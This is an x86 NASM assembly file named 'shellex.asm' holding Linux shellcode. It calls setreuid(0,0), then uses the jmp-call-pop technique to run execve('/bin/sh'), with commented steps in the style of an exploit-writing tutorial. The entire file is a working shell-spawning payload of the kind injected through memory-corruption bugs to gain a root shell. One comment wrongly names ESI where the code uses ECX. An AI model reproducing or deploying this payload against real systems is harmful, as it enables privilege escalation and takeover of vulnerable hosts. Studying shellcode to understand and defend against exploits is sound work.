;shellex.asm
[SECTION wtext write]

global _start


_start:
        xor eax, eax
        mov al, 70                    ; setreuid is syscall 70
        xor ebx, ebx
        xor ecx, ecx
        int 0x80

        jmp short    mycall           ; Immediately jump to the call instruction

        shellcode:
        POP        ecx                ; Store the address of "/bin/sh" in ESI
        xor        eax, eax           ; Zero out EAX
        mov byte   [ecx + 7], al      ; Write the null byte at the end of the string

        mov dword  [ecx + 8],  ecx    ; [ecx+8], i.e. the memory immediately below the string
                                      ;   "/bin/sh", will contain the array pointed to by the
                                      ;   second argument of execve(2); therefore we store in
                                      ;   [ecx+8] the address of the string...
        mov dword  [ecx + 12], eax    ; ...and in [ecx+12] the NULL pointer (EAX is 0)
        mov        al,  0xb           ; Store the number of the syscall (11) in EAX
        lea        ebx, [ecx]         ; Copy the address of the string in EBX
        lea        edx, [ecx + 12]    ; Third argument to execve(2) (NULL pointer)
        lea        ecx, [ecx + 8]     ; Second argument to execve(2)
        int        0x80               ; Execute the system call

        mycall:
        call       shellcode          ; Push the address of "/bin/sh" onto the stack
        db         "/bin/sh"